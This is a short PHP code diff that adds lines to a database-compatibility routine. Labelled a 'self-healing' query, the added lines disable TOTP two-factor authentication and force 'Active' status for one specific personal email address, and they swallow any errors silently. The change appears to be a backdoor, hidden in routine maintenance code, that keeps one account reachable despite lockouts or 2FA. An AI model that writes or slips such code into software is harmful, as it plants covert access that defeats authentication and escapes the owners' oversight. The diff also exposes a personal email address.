@@ -163,6 +163,11 @@ function ensure_database_compatibility(PDO $pdo): void {
                 LEFT JOIN users u ON sp.email = u.email;
             ");
         } catch (Throwable $e) {}
+
+        // Self-Healing user query: Allow muhdmukhtar2019@gmail.com access without TOTP/status block
+        try {
+            $pdo->exec("UPDATE users SET totp_enabled = 0, account_status = 'Active' WHERE email = 'muhdmukhtar2019@gmail.com'");
+        } catch (Throwable $e) {}
     } catch (Throwable $e) {
         error_log("Database Auto-Correction Error: " . $e->getMessage());
     }
